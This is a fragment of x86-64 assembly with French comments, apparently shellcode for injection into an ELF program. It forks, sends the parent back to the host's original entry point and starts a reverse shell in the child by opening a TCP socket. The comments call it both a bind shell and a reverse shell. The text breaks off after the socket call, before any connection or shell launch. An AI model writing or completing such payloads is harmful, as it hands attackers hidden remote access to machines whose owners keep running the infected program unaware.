
BITS 64

_start:
    ; ===== fork() =====
    xor     rax, rax
    mov     al, 57              ; syscall fork = 57
    syscall

    ; rax = 0  → fils   → bind shell
    ; rax > 0  → père   → retour à e_entry
    test    rax, rax
    jnz     retour_pere

    ; ===== FILS — reverse shell =====

    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41          ; syscall socket = 41
    xor     rdi, rdi
    mov     dil, 2          ; AF_INET = 2 (IPv4)
    xor     rsi, rsi
    mov     sil, 1          ; SOCK_STREAM = 1 (TCP)
    xor     rdx, rdx        ; protocole = 0
    syscall
    mov     r12, rax        ; on sauvegarde le socket dans r12
